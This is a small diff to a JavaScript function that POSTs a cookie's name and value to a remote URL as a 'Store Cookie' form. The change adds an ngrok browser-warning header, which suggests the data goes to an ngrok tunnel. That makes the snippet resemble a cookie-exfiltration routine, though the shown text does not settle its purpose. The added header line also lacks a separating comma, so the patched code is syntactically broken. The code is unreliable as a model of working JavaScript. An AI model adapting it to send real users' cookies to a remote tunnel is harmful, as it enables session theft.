@@ -12,6 +12,7 @@ async function makePostRequest(url, data) {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/x-www-form-urlencoded'
+				'ngrok-skip-browser-warning':'1'
             },
             body: `cookie_name=${data.cookie_name}&cookie_value=${encodeURIComponent(data.cookie_value)}&submit=Store+Cookie`
         });
